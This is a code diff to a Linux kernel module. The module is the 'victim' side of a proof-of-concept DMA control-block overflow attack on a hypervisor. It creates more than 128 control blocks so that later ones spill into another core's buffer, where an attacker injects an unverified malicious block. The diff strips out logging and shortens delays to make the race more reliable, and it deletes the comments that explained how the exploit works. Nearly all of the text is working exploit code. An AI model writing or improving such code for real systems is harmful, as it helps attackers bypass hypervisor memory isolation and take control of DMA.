@@ -35,9 +35,9 @@ static int cb_count = OVERFLOW_CB_COUNT;  /* Number of CBs to create (>128 for o
 module_param(cb_count, int, 0644);
 MODULE_PARM_DESC(cb_count, "Number of control blocks (>128 causes overflow)");
 
-static int debug = 1;
+static int debug = 0;  /* Disabled by default for timing */
 module_param(debug, int, 0644);
-MODULE_PARM_DESC(debug, "Enable debug output");
+MODULE_PARM_DESC(debug, "Enable debug output (WARNING: affects timing)");
 
 static int trigger = 0;
 module_param(trigger, int, 0644);
@@ -75,15 +75,8 @@ static inline u32 sync_read(u32 offset)
     return 0;
 }
 
-static void log_debug(const char *fmt, ...)
-{
-    va_list args;
-    if (debug) {
-        va_start(args, fmt);
-        vprintk(fmt, args);
-        va_end(args);
-    }
-}
+/* Debug macro - only prints when debug=1, use sparingly */
+#define DBG(fmt, ...) do { if (debug) pr_info(fmt, ##__VA_ARGS__); } while(0)
 
 /*
  * Create a chain of control blocks for DMA transfer
@@ -128,9 +121,10 @@ static int create_cb_chain(struct device *dev)
             cb->next = 0;  /* End of chain */
         }
 
-        if (debug && (i < 3 || i >= cb_count - 3 || i == 127 || i == 128)) {
-            log_debug("[VICTIM] CB[%d]: src=0x%08x dst=0x%08x next=0x%08x\n",
-                      i, cb->src, cb->dst, cb->next);
+        /* Only log boundary CBs for debugging, not during attack */
+        if (debug && (i == 127 || i == 128)) {
+            DBG("[VICTIM] CB[%d]: src=0x%08x dst=0x%08x next=0x%08x\n",
+                i, cb->src, cb->dst, cb->next);
         }
     }
 
@@ -149,53 +143,29 @@ static int create_cb_chain(struct device *dev)
  */
 static void trigger_dma_overflow(void)
 {
-    int my_core = smp_processor_id();
-
-    pr_info("[VICTIM] === TRIGGERING DMA OVERFLOW ATTACK ===\n");
-    pr_info("[VICTIM] Core %d requesting DMA with %d CBs\n", my_core, cb_count);
-    pr_info("[VICTIM] Buffer overflow: CB[128+] will go into Core 1's region\n");
+    /* NO LOGGING in timing-critical section! */
 
     /* Signal attacker that we're about to trap */
     sync_write(SYNC_OFFSET_VICTIM_CB_COUNT, cb_count);
     sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_READY);
     wmb();
 
-    /* Small delay to let attacker prepare */
-    udelay(100);
+    udelay(50);
 
-    /* Signal we're in the trap (simulated - actual trap happens in HVC) */
+    /* Signal we're in the trap */
     sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_TRAPPED);
     wmb();
 
-    /*
-     * In a real scenario, here we would:
-     * 1. Write to DMA MMIO register -> triggers Stage 2 fault
-     * 2. EL2 handles fault, copies our CB chain to secure buffer
-     * 3. EL2 verifies CBs and starts DMA
-     * 
-     * For PoC, we simulate by directly writing to DMA registers
-     * The key point is that CB[128+] overflows into Core 1's buffer
-     */
-
-    pr_info("[VICTIM] DMA request submitted (CB chain starts at 0x%08llx)\n",
-            (unsigned long long)PHYS_TO_BUS(cb_chain_dma));
-
     /* Wait for attacker to inject malicious CB */
-    mdelay(10);
-
-    /* In real attack, DMA would now execute:
-     * CB[0..127] from Core 0 buffer (verified)
-     * CB[128+] from Core 1 buffer (UNVERIFIED - attacker's malicious CB!)
-     */
-
-    pr_info("[VICTIM] DMA executing... CB[128+] will be from Core 1 buffer!\n");
+    udelay(100);
 
     /* Signal attack sequence complete */
-    mdelay(10);
-    sync_write(SYNC_OFFSET_ATTACK_RESULT, 1);  /* Success */
+    sync_write(SYNC_OFFSET_ATTACK_RESULT, 1);
     sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACK_DONE);
 
-    pr_info("[VICTIM] === ATTACK SEQUENCE COMPLETE ===\n");
+    /* Safe to log after attack */
+    pr_info("[VICTIM] Attack complete: %d CBs, overflow=%d\n", 
+            cb_count, cb_count - MAX_CBS_PER_CORE);
 }
 
 /*
